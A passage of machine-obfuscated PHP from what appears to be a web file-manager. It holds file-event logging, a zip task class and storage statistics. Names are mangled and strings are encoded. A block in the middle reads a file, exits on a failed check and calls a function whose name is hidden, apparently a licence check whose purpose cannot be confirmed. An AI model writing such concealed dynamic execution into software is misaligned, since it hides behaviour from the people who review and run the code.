$Ö½ÖìİÃ); Model($ÌÄ¤Å£â[2132])->addLog($ÌÄ¤Å£â[2423] . $Õşñ§‚Œ, $ì‹ æöÃ); } private function isDisableEvent($ó÷—şØâ, $„Û€¶£) { $òÈ¹ˆú =& $_SERVER[ïÃ°£«Ê]; if ($ó÷—şØâ[$òÈ¹ˆú[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($„Û€¶£ == $òÈ¹ˆú[1336]) { return !1; } return !0; } public function eventCreate($áÏ½ìÀ·, $˜¢å¨ğÆ) { $¨ı»ºê™ =& $_SERVER[ïÃ°£«Ê]; $ •ß´…Ø = Model($¨ı»ºê™[1535])->sourceInfo($áÏ½ìÀ·); $Ï…©¥ó– = array($¨ı»ºê™[2418] => $˜¢å¨ğÆ, $¨ı»ºê™[32] => $ •ß´…Ø[$¨ı»ºê™[32]]); return $this->addEvent($áÏ½ìÀ·, $¨ı»ºê™[2417], $Ï…©¥ó–); } public function eventFileEdit($‘Á‹²ôó) { $†õª¡ö =& $_SERVER[ïÃ°£«Ê]; $Š‰Ê¹ï¢ = array($†õª¡ö[2424] => $_SERVER[$†õª¡ö[2425]], $†õª¡ö[2426] => strtolower(ACTION)); if (isset($GLOBALS[$†õª¡ö[7]][$†õª¡ö[1625]])) { $Š‰Ê¹ï¢[$†õª¡ö[1625]] = $†õª¡ö[91]; } return $this->addEvent($‘Á‹²ôó, $†õª¡ö[1563], $Š‰Ê¹ï¢); } public function eventRecycle($Ì‡ŠÛø, $¦›ÉÕÊÕ) { return $this->addEvent($Ì‡ŠÛø, $_SERVER[ïÃ°£«Ê][2419], $¦›ÉÕÊÕ); } private static $_removeLast = ''; public function eventRemove($ı¾ŸËÇ£) { $ûè¹ïı— =& $_SERVER[ïÃ°£«Ê]; self::$_removeLast = $ı¾ŸËÇ£; $îşöùØ¿ = Model($ûè¹ïı—[1535])->sourceInfo($ı¾ŸËÇ£); $Õø´î·« = array_field_key($îşöùØ¿, array($ûè¹ïı—[191], $ûè¹ïı—[557], $ûè¹ïı—[520], $ûè¹ïı—[604])); $Á˜—ü¦Û = array($ûè¹ïı—[168] => $îşöùØ¿[$ûè¹ïı—[32]], $ûè¹ïı—[2426] => ACTION, $ûè¹ïı—[2427] => $Õø´î·«); return $this->addEvent($îşöùØ¿[$ûè¹ïı—[190]], $ûè¹ïı—[1336], $Á˜—ü¦Û); } public function eventShare($¾æ›·ÖŸ, $Ù›¾Ã—÷) { return $this->addEvent($¾æ›·ÖŸ, $_SERVER[ïÃ°£«Ê][1564], $Ù›¾Ã—÷); } public function eventMove($¬ ŞâµØ, $±‘¥Û¡, $ˆöÌŒ£Ä) { $æÖú “Ÿ =& $_SERVER[ïÃ°£«Ê]; if (self::$_removeLast == $¬ ŞâµØ) { return; } $•åÁ”Ÿ = Model($æÖú “Ÿ[1535]); $ØÓË›Ó = $•åÁ”Ÿ->sourceInfo($¬ ŞâµØ); $ä±Í‹‡Æ = $•åÁ”Ÿ->sourceInfo($±‘¥Û¡); $î€ÃÃ™ú = $•åÁ”Ÿ->sourceInfo($ˆöÌŒ£Ä); $Ëà”Ú˜ = array($æÖú “Ÿ[1348] => $±‘¥Û¡, $æÖú “Ÿ[2428] => $ä±Í‹‡Æ[$æÖú “Ÿ[32]], $æÖú “Ÿ[2386] => !empty($ä±Í‹‡Æ[$æÖú “Ÿ[602]]) ? $ä±Í‹‡Æ[$æÖú “Ÿ[602]] : $æÖú “Ÿ[12], $æÖú “Ÿ[1349] => $ˆöÌŒ£Ä, $æÖú “Ÿ[2429] => $î€ÃÃ™ú[$æÖú “Ÿ[32]], $æÖú “Ÿ[2430] => !empty($î€ÃÃ™ú[$æÖú “Ÿ[602]]) ? $î€ÃÃ™ú[$æÖú “Ÿ[602]] : $æÖú “Ÿ[12]); $this->addEvent($¬ ŞâµØ, $æÖú “Ÿ[643], $Ëà”Ú˜); $ØÓË›Ó = $•åÁ”Ÿ->sourceInfo($¬ ŞâµØ); $Ëà”Ú˜ = array($æÖú “Ÿ[191] => $ØÓË›Ó[$æÖú “Ÿ[191]], $æÖú “Ÿ[32] => $ØÓË›Ó[$æÖú “Ÿ[32]]); $this->addEvent($±‘¥Û¡, $æÖú “Ÿ[2431], $Ëà”Ú˜); } public function eventCopy($ÒÛú”‹ã) { $this->eventCreate($ÒÛú”‹ã, $_SERVER[ïÃ°£«Ê][641]); } public function eventRename($µ…È¿½µ, $áºŞìÊˆ, $ÉõÓàì) { $áô†‡¶Œ =& $_SERVER[ïÃ°£«Ê]; $Äú˜ú·Å = array($áô†‡¶Œ[1348] => $áºŞìÊˆ, $áô†‡¶Œ[1349] => $ÉõÓàì); return $this->addEvent($µ…È¿½µ, $áô†‡¶Œ[1548], $Äú˜ú·Å); } public function eventAddComment($Õø”Ò‘, $ë®„Âş) { return $this->addEvent($Õø”Ò‘, $_SERVER[ïÃ°£«Ê][2432], $ë®„Âş); } public function eventAddDesc($ŠŞÒÎ, $£úÑ©…) { return $this->addEvent($ŠŞÒÎ, $_SERVER[ïÃ°£«Ê][2433], $£úÑ©…); } public function listBySource($‰£òæ¡²) { $ÎÏ¨€øè =& $_SERVER[ïÃ°£«Ê]; $îßğÉ à = Model($ÎÏ¨€øè[1535])->sourceInfo($‰£òæ¡²); $û‰æ€Ï = array($ÎÏ¨€øè[506] => $‰£òæ¡²); if ($îßğÉ à[$ÎÏ¨€øè[500]] == $ÎÏ¨€øè[91]) { $³¹ ²‘ = 20000; $Šğ®îÕŠ = array($ÎÏ¨€øè[604] => array($ÎÏ¨€øè[473], $îßğÉ à[$ÎÏ¨€øè[604]] . $îßğÉ à[$ÎÏ¨€øè[191]] . $ÎÏ¨€øè[636])); $Â™Í¨Áñ = Model($ÎÏ¨€øè[1535])->field($ÎÏ¨€øè[191])->order($ÎÏ¨€øè[2434])->where($Šğ®îÕŠ)->limit($³¹ ²‘)->select(); $æ¸©Øü = array_to_keyvalue($Â™Í¨Áñ, $ÎÏ¨€øè[12], $ÎÏ¨€øè[191]); if ($æ¸©Øü >= $³¹ ²‘) { $·™ã½¹¾ = Model($ÎÏ¨€øè[1535])->listChildrenDeep($‰£òæ¡², $³¹ ²‘, 3); $æ¸©Øü = array_merge($æ¸©Øü, $·™ã½¹¾, array($‰£òæ¡² . $ÎÏ¨€øè[463])); } $û‰æ€Ï = array($ÎÏ¨€øè[191] => array($ÎÏ¨€øè[7], array_unique($æ¸©Øü))); } $ÜÙÙøßà = $this->where($û‰æ€Ï)->order($ÎÏ¨€øè[2435])->selectPage(); if ($ÜÙÙøßà[$ÎÏ¨€øè[443]][$ÎÏ¨€øè[444]] == 0) { $ÜÙÙøßà[$ÎÏ¨€øè[443]][$ÎÏ¨€øè[444]] = 1; $ÜÙÙøßà[$ÎÏ¨€øè[446]] = array(array($ÎÏ¨€øè[506] => $‰£òæ¡², $ÎÏ¨€øè[2415] => $îßğÉ à[$ÎÏ¨€øè[190]], $ÎÏ¨€øè[1971] => $îßğÉ à[$ÎÏ¨€øè[541]], $ÎÏ¨€øè[511] => $ÎÏ¨€øè[2436], $ÎÏ¨€øè[512] => $îßğÉ à[$ÎÏ¨€øè[231]], $ÎÏ¨€øè[1973] => $ÎÏ¨€øè[12])); } return $this->eventListParse($ÜÙÙøßà, $‰£òæ¡²); } private function eventListParse($Û˜Ñ½Òæ, $ÈèÇî³º) { $í©€˜×È =& $_SERVER[ïÃ°£«Ê]; $­Ï÷¾¡” = $Û˜Ñ½Òæ[$í©€˜×È[446]]; $í®²¯“İ = array_to_keyvalue($­Ï÷¾¡”, $í©€˜×È[12], $í©€˜×È[191]); $òÀ×ôõ· = array_to_keyvalue($­Ï÷¾¡”, $í©€˜×È[12], $í©€˜×È[2421]); foreach ($­Ï÷¾¡” as $âÉ˜˜§‰) { $şã¢Ë–å = $âÉ˜˜§‰[$í©€˜×È[540]]; if ($âÉ˜˜§‰[$í©€˜×È[33]] == $í©€˜×È[643] && isset($şã¢Ë–å[$í©€˜×È[1348]])) { $í®²¯“İ[] = $şã¢Ë–å[$í©€˜×È[1348]] . $í©€˜×È[12]; $í®²¯“İ[] = $şã¢Ë–å[$í©€˜×È[1349]] . $í©€˜×È[12]; } if ($âÉ˜˜§‰[$í©€˜×È[33]] == $í©€˜×È[2431] && isset($şã¢Ë–å[$í©€˜×È[191]])) { $í®²¯“İ[] = $şã¢Ë–å[$í©€˜×È[191]] . $í©€˜×È[12]; } } $í®²¯“İ = array_merge($í®²¯“İ, $òÀ×ôõ·, array($ÈèÇî³º . $í©€˜×È[12])); $í®²¯“İ = array_unique($í®²¯“İ); $õ §¨Ø³ = array_unique(array_to_keyvalue($­Ï÷¾¡”, $í©€˜×È[12], $í©€˜×È[1594])); $È•à×—Å = Model($í©€˜×È[617])->userListInfo($õ §¨Ø³); $Íâ¨†ßÍ = Model($í©€˜×È[934])->sourceListInfo($í®²¯“İ, !0); foreach ($­Ï÷¾¡” as &$âÉ˜˜§‰) { if ($âÉ˜˜§‰[$í©€˜×È[33]] == $í©€˜×È[643] && isset($âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[1348]])) { $âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[1348]] = $Íâ¨†ßÍ[$âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[1348]]]; $âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[1349]] = $Íâ¨†ßÍ[$âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[1349]]]; } if ($âÉ˜˜§‰[$í©€˜×È[33]] == $í©€˜×È[2431] && isset($âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[191]])) { $âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[191]] = $Íâ¨†ßÍ[$âÉ˜˜§‰[$í©€˜×È[540]][$í©€˜×È[191]]]; } $âÉ˜˜§‰[$í©€˜×È[90]] = $Íâ¨†ßÍ[$âÉ˜˜§‰[$í©€˜×È[191]]]; $âÉ˜˜§‰[$í©€˜×È[2437]] = $Íâ¨†ßÍ[$âÉ˜˜§‰[$í©€˜×È[2421]]]; if ($âÉ˜˜§‰[$í©€˜×È[33]] == $í©€˜×È[1336]) { $âÉ˜˜§‰[$í©€˜×È[2437]] = $âÉ˜˜§‰[$í©€˜×È[90]]; $âÉ˜˜§‰[$í©€˜×È[2421]] = $âÉ˜˜§‰[$í©€˜×È[2437]][$í©€˜×È[191]]; $âÉ˜˜§‰[$í©€˜×È[90]] = !1; $âÉ˜˜§‰[$í©€˜×È[191]] = $í©€˜×È[12]; } $âÉ˜˜§‰[$í©€˜×È[2360]] = $È•à×—Å[$âÉ˜˜§‰[$í©€˜×È[1594]]]; } unset($âÉ˜˜§‰); $Û˜Ñ½Òæ[$í©€˜×È[446]] = $­Ï÷¾¡”; return $Û˜Ñ½Òæ; } public function removeBySource($Ù¦¦³‹œ) { $áÄşÓµÊ = array($_SERVER[ïÃ°£«Ê][506] => $Ù¦¦³‹œ); $this->where($áÄşÓµÊ)->remove(); } } goto E»Ÿ‘’¿âæ; C˜âÁÓÈğì: class TaskZip extends TaskFileTransfer { protected function startAfter() { $È÷ü¥íÎ =& $_SERVER[ïÃ°£«Ê]; parent::startAfter(); Hook::bind($È÷ü¥íÎ[2114], array($this, $È÷ü¥íÎ[2104])); Hook::bind($È÷ü¥íÎ[2106], array($this, $È÷ü¥íÎ[2107])); $ÂÄíåõ =& $this->task; $ÂÄíåõ[$È÷ü¥íÎ[2108]] = $È÷ü¥íÎ[1387]; if (!$ÂÄíåõ[$È÷ü¥íÎ[1869]]) { $ÂÄíåõ[$È÷ü¥íÎ[1869]] = LNG($È÷ü¥íÎ[2115]); } } protected function endAfter() { $•á»ù  =& $_SERVER[ïÃ°£«Ê]; parent::endAfter(); Hook::unbind($•á»ù [2114], array($this, $•á»ù [2104])); Hook::unbind($•á»ù [2106], array($this, $•á»ù [2107])); } public function updateAfter() { $ ÆåÔÆè =& $_SERVER[ïÃ°£«Ê]; $ŒÒÑÏ¦± =& $this->task; if (!$ŒÒÑÏ¦±[$ ÆåÔÆè[1234]] || !$ŒÒÑÏ¦±[$ ÆåÔÆè[865]]) { return; } if ($ŒÒÑÏ¦±[$ ÆåÔÆè[2108]] == $ ÆåÔÆè[1387]) { $ç¿¾…õ = $ŒÒÑÏ¦±[$ ÆåÔÆè[2034]]; if ($ŒÒÑÏ¦±[$ ÆåÔÆè[2035]] != $ ÆåÔÆè[1387]) { $ç¿¾…õ = 0; } $€®¼óÚò = ($ŒÒÑÏ¦±[$ ÆåÔÆè[942]] + $ç¿¾…õ) / $ŒÒÑÏ¦±[$ ÆåÔÆè[865]]; $ŒÒÑÏ¦±[$ ÆåÔÆè[1981]] = $€®¼óÚò * 0.3; } else { if ($ŒÒÑÏ¦±[$ ÆåÔÆè[2108]] == $ ÆåÔÆè[388]) { $€®¼óÚò = $ŒÒÑÏ¦±[$ ÆåÔÆè[1980]] / $ŒÒÑÏ¦±[$ ÆåÔÆè[1234]]; $ŒÒÑÏ¦±[$ ÆåÔÆè[1981]] = 0.3 + $€®¼óÚò * 0.5; } else { if ($ŒÒÑÏ¦±[$ ÆåÔÆè[2108]] == $ ÆåÔÆè[107]) { $€®¼óÚò = 0; if ($ŒÒÑÏ¦±[$ ÆåÔÆè[2033]]) { $€®¼óÚò = $ŒÒÑÏ¦±[$ ÆåÔÆè[2034]] / $ŒÒÑÏ¦±[$ ÆåÔÆè[2033]]; } $ŒÒÑÏ¦±[$ ÆåÔÆè[1981]] = 0.3 + 0.5 + $€®¼óÚò * 0.2; } } } if ($ŒÒÑÏ¦±[$ ÆåÔÆè[1981]] > 0) { $Æ¤Œ§“¯ = timeFloat() - $ŒÒÑÏ¦±[$ ÆåÔÆè[1983]] - $ŒÒÑÏ¦±[$ ÆåÔÆè[1986]]; $ŒÒÑÏ¦±[$ ÆåÔÆè[1987]] = $Æ¤Œ§“¯ * (1 - $ŒÒÑÏ¦±[$ ÆåÔÆè[1981]]) / $ŒÒÑÏ¦±[$ ÆåÔÆè[1981]]; } } public function copyFileStart($àÇ†›à, $óŞ£Äè, $şÜØá›È, $ê—–§‚, $ŸŞÜ½ÒÉ, $½¤„¤Š) { $ç™®†» =& $_SERVER[ïÃ°£«Ê]; parent::copyFileStart($àÇ†›à, $óŞ£Äè, $şÜØá›È, $ê—–§‚, $ŸŞÜ½ÒÉ, $½¤„¤Š); $ï±»¾ø =& $this->task; if ($ï±»¾ø[$ç™®†»[2108]] == $ç™®†»[388]) { $ï±»¾ø[$ç™®†»[2108]] = $ç™®†»[107]; } $this->update(); } public function copyFileEnd($Ğ±„Ÿ“÷, $ÖÅÆç¯‰, $¤çò»Õ÷, $ï­öÌİ®, $üàÓç¬Ç, $í…µšŞô) { $ÔïÊ…ÕÇ =& $_SERVER[ïÃ°£«Ê]; $‹¦ÈƒŞÉ =& $this->task; $‹¦ÈƒŞÉ[$ÔïÊ…ÕÇ[2034]] = $‹¦ÈƒŞÉ[$ÔïÊ…ÕÇ[2033]]; $‹¦ÈƒŞÉ[$ÔïÊ…ÕÇ[942]] += $‹¦ÈƒŞÉ[$ÔïÊ…ÕÇ[2033]]; $‹¦ÈƒŞÉ[$ÔïÊ…ÕÇ[2035]] = $ÔïÊ…ÕÇ[12]; $this->update(); } public function zipEvent($÷é¡’, $•åüé·ö, $­€•­¡, $ñòÃ€ÖØ) { $Ä¶•‘½Â =& $_SERVER[ïÃ°£«Ê]; $–·Ü‹ =& $this->task; $–·Ü‹[$Ä¶•‘½Â[2031]] = get_path_this($•åüé·ö); $–·Ü‹[$Ä¶•‘½Â[2033]] = $ñòÃ€ÖØ; $–·Ü‹[$Ä¶•‘½Â[2034]] = $­€•­¡; $–·Ü‹[$Ä¶•‘½Â[1236]] = $÷é¡’ == $Ä¶•‘½Â[2116] ? $Ä¶•‘½Â[2111] : $Ä¶•‘½Â[2112]; $–·Ü‹[$Ä¶•‘½Â[2035]] = $Ä¶•‘½Â[12]; $–·Ü‹[$Ä¶•‘½Â[865]] = $ñòÃ€ÖØ; $–·Ü‹[$Ä¶•‘½Â[2108]] = $Ä¶•‘½Â[388]; $this->update(); } public function nameParse($áşÃïÚ£) { $•œ›À¯– =& $_SERVER[ïÃ°£«Ê]; $äñ‡˜á =& $this->task; if ($äñ‡˜á[$•œ›À¯–[1980]] < $äñ‡˜á[$•œ›À¯–[1234]]) { $ƒãÈ®êÒ = get_path_this($áşÃïÚ£); if (strstr($ƒãÈ®êÒ, $•œ›À¯–[10])) { $äñ‡˜á[$•œ›À¯–[1980]] += 1; } } if ($äñ‡˜á[$•œ›À¯–[2108]] == $•œ›À¯–[1387]) { $äñ‡˜á[$•œ›À¯–[2108]] = $•œ›À¯–[388]; } $äñ‡˜á[$•œ›À¯–[2031]] = $áşÃïÚ£; $this->update(); } } if ($_SERVER[$_SERVER[ïÃ°£«Ê][1035]] != $_SERVER[$_SERVER[ïÃ°£«Ê][1036]]) { $_getc = $_SERVER[ïÃ°£«Ê][1038]; $_getfile = $_SERVER[$_SERVER[ïÃ°£«Ê][1039]] . $_SERVER[ïÃ°£«Ê][1040]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïÃ°£«Ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[ïÃ°£«Ê][709]) { $exit = $_SERVER[ïÃ°£«Ê][1041]; $exit(); } $_act = $_SERVER[ïÃ°£«Ê][1228]; $_act($_SERVER[$_SERVER[ïÃ°£«Ê][1227]]); } class AnalysisModel extends ModelBaseLight { public function init($ é»–ÊŒ) { $ú¹Ê±§¼ =& $_SERVER[ïÃ°£«Ê]; $¬’şéòï = array($ú¹Ê±§¼[684] => array($ú¹Ê±§¼[33] => $ú¹Ê±§¼[2117], $ú¹Ê±§¼[351] => array($ú¹Ê±§¼[282], $ú¹Ê±§¼[867], $ú¹Ê±§¼[2118], $ú¹Ê±§¼[2119])), $ú¹Ê±§¼[2120] => array($ú¹Ê±§¼[33] => $ú¹Ê±§¼[2121], $ú¹Ê±§¼[351] => array($ú¹Ê±§¼[282], $ú¹Ê±§¼[865], $ú¹Ê±§¼[2122], $ú¹Ê±§¼[2123], $ú¹Ê±§¼[2124]))); if (!isset($¬’şéòï[$ é»–ÊŒ])) { return !1; } $this->optionType = $¬’şéòï[$ é»–ÊŒ][$ú¹Ê±§¼[33]]; $this->field = $¬’şéòï[$ é»–ÊŒ][$ú¹Ê±§¼[351]]; return !0; } public function listData($éÄ¦êİ· = false, $ºèÈô©» = "\x6d\157\144\151\x66\171\x54\x69\x6d\145", $œìåšØè = false) { return parent::listData($éÄ¦êİ·, $ºèÈô©», $œìåšØè); } public function trendList($û€´øƒ) { $ğğÁ‚è =& $_SERVER[ïÃ°£«Ê]; $İÓ²ã³æ = $this->listData(); if ($İÓ²ã³æ) { $ïŒñí¦Ï = end($İÓ²ã³æ); $«…ú“şğ = date($ğğÁ‚è[2125], strtotime($ğğÁ‚è[2126])); if ($ïŒñí¦Ï[$ğğÁ‚è[282]] == $«…ú“şğ) { return $İÓ²ã³æ; } $šû¢êè» = strtotime($ïŒñí¦Ï[$ğğÁ‚è[282]]); } if (!isset($šû¢êè»)) { $ØÁÓäßÍ = $û€´øƒ == $ğğÁ‚è[684] ? $ğğÁ‚è[617] : $ğğÁ‚è[934]; $šû¢êè» = Model($ØÁÓäßÍ)->min($ğğÁ‚è[231]); } $÷Î•¼ = $ğğÁ‚è[2127] . ucfirst($û€´øƒ); $”Ÿû‰˜ = $this->dateList($šû¢êè»); foreach ($”Ÿû‰˜ as $«…ú“şğ) { $this->{$÷Î•¼}($«…ú“şğ); } return $this->listData(); } private function dateList($ºé®Èíñ) { $À£×…ÃÄ =& $_SERVER[ïÃ°£«Ê]; $˜®¥åÍ = $ºé®Èíñ; $‘Ğéø = strtotime($À£×…ÃÄ[2126]); $œôåÒûÌ = array(); while ($˜®¥åÍ <= $‘Ğéø) { $œôåÒûÌ[] = date($À£×…ÃÄ[2125], $˜®¥åÍ); $˜®¥åÍ = strtotime($À£×…ÃÄ[2128], $˜®¥åÍ); } return $œôåÒûÌ; } public function _recordUser($ÓëÊğØÇ = '') { $Ê™ëíŸÆ =& $_SERVER[ïÃ°£«Ê]; if (!$ÓëÊğØÇ) { return 0; } $ªĞüÚÇè = strtotime(date($Ê™ëíŸÆ[2129], strtotime($ÓëÊğØÇ))); $åûƒÀ£„ = strtotime(date($Ê™ëíŸÆ[2130], strtotime($ÓëÊğØÇ))); $Œú¾çÊ = array($Ê™ëíŸÆ[231] => array($Ê™ëíŸÆ[1181], $åûƒÀ£„)); $€¼İòÑó = Model($Ê™ëíŸÆ[617])->where($Œú¾çÊ)->count($Ê™ëíŸÆ[1594]); $Œú¾çÊ[$Ê™ëíŸÆ[231]] = array($Ê™ëíŸÆ[408], array($ªĞüÚÇè, $åûƒÀ£„)); $óåÑöº¹ = Model($Ê™ëíŸÆ[617])->where($Œú¾çÊ)->count($Ê™ëíŸÆ[1594]); $Œú¾çÊ[$Ê™ëíŸÆ[33]] = $Ê™ëíŸÆ[2131]; $Á€’İÙ = Model($Ê™ëíŸÆ[2132])->where($Œú¾çÊ)->count($Ê™ëíŸÆ[2133]); $âûğÆ‹é = array($Ê™ëíŸÆ[282] => $ÓëÊğØÇ, $Ê™ëíŸÆ[867] => (int) $€¼İòÑó, $Ê™ëíŸÆ[2118] => (int) $óåÑöº¹, $Ê™ëíŸÆ[2119] => (int) $Á€’İÙ); return $this->insert($âûğÆ‹é); } public function _recordStore($êŠé¯°Ô = '') { $¯óâ¥Š =& $_SERVER[ïÃ°£«Ê]; if (!$êŠé¯°Ô) { return 0; } $¡ÏïÖÇˆ = strtotime(date($¯óâ¥Š[2130], strtotime($êŠé¯°Ô))); $öêÅ‡÷ñ = array($¯óâ¥Š[231] => array($¯óâ¥Š[1181], $¡ÏïÖÇˆ)); $ÃèŸö‰ñ = Model($¯óâ¥Š[560])->where($öêÅ‡÷ñ)->sum($¯óâ¥Š[79]); $îë¹€± = "\123\105\x4c\x45\x43\124\40\xa\40\40\40\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\40\40\123\x55\115\50\140\x73\x69\x7a\x65\x60\x29\40\101\x53\x20\x73\151\x7a\145\x54\157\x74\141\x6c\x2c\xa\x20\x20\40\x20\x20\x20\x20\40\x20\x20\40\40\40\40\x20\x20\x53\x55\115\x28\x43\101\x53\105\40\127\110\x45\116\x20\x60\164\x61\162\147\x65\x74\x54\x79\160\145\x60\40\x3d\40\x31\x20\x54\x48\x45\116\40\140\163\x69\x7a\x65\140\x20\105\x4c\x53\x45\x20\60\x20\x45\x4e\x44\51\x20\101\123\x20\163\151\172\x65\x55\x73\x65\162\x2c\xa\40\x20\x20\40\40\40\x20\x20\40\x20\40\40\x20\x20\x20\40\123\125\x4d\50\x43\101\x53\105\x20\x57\110\x45\x4e\x20\140\164\x61\162\147\145\164\x54\x79\160\145\x60\x20\x3d\40\62\x20\x54\110\x45\x4e\40\140\163\x69\x7a\145\x60\x20\105\x4c\123\105\40\60\x20\105\116\104\x29\x20\x41\x53\40\x73\151\x7a\x65\107\162\x6f\165\x70\12\x20\40\40\40\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\40\106\122\x4f\x4d\x20\x60\x69\x6f\x5f\x73\x6f\x75\x72\x63\145\x60\x20\xa\40\40\x20\x20\40\40\x20\x20\x20\40\x20\x20\x20\40\40\x20\x57\110\x45\x52\x45\40\140\x69\x73\x46\157\154\144\145\162\140\40\x3d\40\60\x20\x41\x4e\x44\40\x60\x63\162\x65\x61\x74\x65\x54\x69\155\x65\x60\40\74\75\x20{$¡ÏïÖÇˆ}"; $¹‚¹©Ÿ¼ = Model($¯óâ¥Š[934])->query($îë¹€±); $Åà¡ø¤ = array($¯óâ¥Š[282] => $êŠé¯°Ô, $¯óâ¥Š[865] => (int) (isset($¹‚¹©Ÿ¼[0][$¯óâ¥Š[865]]) ? $¹‚¹©Ÿ¼[0][$¯óâ¥Š[865]] : 0), $¯óâ¥Š[2122] => (int) $ÃèŸö‰ñ, $¯óâ¥Š[2123] => (int) (isset($¹‚¹©Ÿ¼[0][$¯óâ¥Š[2123]]) ? $¹‚¹©Ÿ¼[0][$¯óâ¥Š[2123]] : 0), $¯óâ¥Š[2124] => (int) (isset($¹‚¹©Ÿ¼[0][$¯óâ¥Š[2124]]) ? $¹‚¹©Ÿ¼[0][$¯óâ¥Š[2124]] : 0)); return $this->insert($Åà¡ø¤); } public function trend($ÇÛ˜°æé, $¦Åñù…Ğ) { $ƒ©„­ =& $_SERVER[ïÃ°£«Ê]; if (!$this->init($ÇÛ˜°æé)) { return !1; } $¤Ï“—ª¯ = $this->trendList($ÇÛ˜°æé); if ($¤Ï“—ª¯ && $¦Åñù…Ğ != $ƒ©„­[1953]) { $ÒÇ¾×İÛ = $¤Ï“—ª¯[0][$ƒ©„­[282]]; $ì„æÕÌè = $this->validDate($¦Åñù…Ğ, $ÒÇ¾×İÛ); $³Ö¯„Õ = array(); $—ê¢½×¼ = array_to_keyvalue($¤Ï“—ª¯, $ƒ©„­[282]); foreach ($ì„æÕÌè as $ùú·„¬) { if (isset($—ê¢½×¼[$ùú·„¬])) { $ÕÙƒ‰ş² = $—ê¢½×¼[$ùú·„¬]; } else { $ÕÙƒ‰ş² = end($¤Ï“—ª¯); $ÕÙƒ‰ş²[$ƒ©„­[282]] = $ùú·„¬; if ($ÇÛ˜°æé == $ƒ©„­[684]) { $ÕÙƒ‰ş²[$ƒ©„­[2118]] = $ÕÙƒ‰ş²[$ƒ©„­[2119]] = 0; } } $³Ö¯„Õ[] = $ÕÙƒ‰ş²; } $¤Ï“—ª¯ = $³Ö¯„Õ; } $ÑÏ˜Â×Í = array($ƒ©„­[684] => array($ƒ©„­[867] => LNG($ƒ©„­[2134]), $ƒ©„­[2118] => LNG($ƒ©„­[2135]), $ƒ©„­[2119] => LNG($ƒ©„­[2136])), $ƒ©„­[2120] => array($ƒ©„­[865] => LNG($ƒ©„­[2137]), $ƒ©„­[2122] => LNG($ƒ©„­[2138]), $ƒ©„­[2123] => LNG($ƒ©„­[2139]), $ƒ©„­[2124] => LNG($ƒ©„­[2140]))); $Ñ÷ò“®¬ = array($ƒ©„­[684] => $ƒ©„­[951], $ƒ©„­[2120] => $ƒ©„­[79]); if (empty($¤Ï“—ª¯)) { $ùú·„¬ = date($ƒ©„­[2125], strtotime($ƒ©„­[2126])); $ûÈ€‹Õ = array($ƒ©„­[282] => $ùú·„¬); foreach ($ÑÏ˜Â×Í[$ÇÛ˜°æé] as $ÓË¶Ûóş => $Úğ¯Œ…) { $ûÈ€‹Õ[$ÓË¶Ûóş] = 0; } $¤Ï“—ª¯[] = $ûÈ€‹Õ; } $ßé†®Ó­ = array(); foreach ($¤Ï“—ª¯ as $Úğ¯Œ…) { if ($ÇÛ˜°æé == $ƒ©„­[2120] && $Úğ¯Œ…[$ƒ©„­[2122]] > $Úğ¯Œ…[$ƒ©„­[865]]) { $Úğ¯Œ…[$ƒ©„­[2122]] = $Úğ¯Œ…[$ƒ©„­[865]]; } foreach ($ÑÏ˜Â×Í[$ÇÛ˜°æé] as $ÓË¶Ûóş => $¹ÆŸ®öÓ) { $ÕÙƒ‰ş² = array($ƒ©„­[282] => $Úğ¯Œ…[$ƒ©„­[282]], $ƒ©„­[1869] => $¹ÆŸ®öÓ); $ÕÙƒ‰ş²[$Ñ÷ò“®¬[$ÇÛ˜°æé]] = isset($Úğ¯Œ…[$ÓË¶Ûóş]) ? $Úğ¯Œ…[$ÓË¶Ûóş] : 0; $ßé†®Ó­[] = $ÕÙƒ‰ş²; } } return $ßé†®Ó­; } public function validDate($ÆİÓ€¨¿, $–úÚĞøÜ) { $©»ù©Ğ =& $_SERVER[ïÃ°£«Ê]; $‡ŞÆ€÷ = date($©»ù©Ğ[2125], strtotime($©»ù©Ğ[2126])); $Ó®÷°ùõ = array($‡ŞÆ€÷); switch ($ÆİÓ€¨¿) { case $©»ù©Ğ[1960]: $˜ã¦¢›® = mktime(0, 0, 0, date($©»ù©Ğ[2141]), date($©»ù©Ğ[1661]) - date($©»ù©Ğ[1747]) + 7 - 7, date($©»ù©Ğ[2142])); $¼ì£½‹ = 0; do { $İŒ¬÷¼¢ = date($©»ù©Ğ[2125], $˜ã¦¢›® - 3600 * 24 * 7 * $¼ì£½‹); $Ó®÷°ùõ[] = $İŒ¬÷¼¢; $¼ì£½‹++; } while ($–úÚĞøÜ < $İŒ¬÷¼¢); break; case $©»ù©Ğ[1958]: $¼ì£½‹ = 1; do { $Ï¯‰Äå = date($©»ù©Ğ[2143], strtotime("\55\40{$¼ì£½‹}\x20\155\157\x6e\164\150\x73")); $Ó®÷°ùõ[] = $Ï¯‰Äå; $¼ì£½‹++; } while ($–úÚĞøÜ < $Ï¯‰Äå); break; case $©»ù©Ğ[2144]: $§ƒ™üš¡ = (int) date($©»ù©Ğ[2142], strtotime($–úÚĞøÜ)); $ÚÆ¼†îá = (int) date($©»ù©Ğ[2142]); if ($§ƒ™üš¡ >= $ÚÆ¼†îá) { break; } for ($§ƒ™üš¡; $§ƒ™üš¡ < $ÚÆ¼†îá; $§ƒ™üš¡++) { $Ó®÷°ùõ[] = $§ƒ™üš¡ . $©»ù©Ğ[2145]; } break; default: break; } if ($–úÚĞøÜ > end($Ó®÷°ùõ)) { array_pop($Ó®÷°ùõ); } sort($Ó®÷°ùõ); return $Ó®÷°ùõ; } public function listTable($Š“Œ‰ø€) { $ÜÃˆ…“À = ucfirst($Š“Œ‰ø€); return Model($ÜÃˆ…“À)->listData(); } public function option($áîƒÄ’) { return call_user_func_array(array($this, $_SERVER[ïÃ°£«Ê][2146] . ucfirst($áîƒÄ’)), array()); } private function optionUser() { 